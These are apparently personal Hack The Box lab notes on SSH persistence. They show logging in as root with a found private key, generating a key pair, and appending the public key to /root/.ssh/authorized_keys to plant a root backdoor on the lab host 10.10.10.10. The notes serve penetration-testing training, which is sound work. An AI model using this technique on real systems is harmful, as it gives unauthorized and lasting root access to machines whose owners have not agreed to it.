
## using:
samdem@htb[/htb]$ vim id_rsa
samdem@htb[/htb]$ chmod 600 id_rsa
samdem@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa
samdem@htb[/htb]$ export TERM=xterm-256color # because of kitty terminal

## adding:
if we have write permissions
ssh-keygen -f key
echo "" >> /root/.ssh/authorized_keys
ssh root@10.10.10.10 -i key
```shell-session
samdem@htb[/htb]$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
```

```shell-session
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

```shell-session
samdem@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost# 
```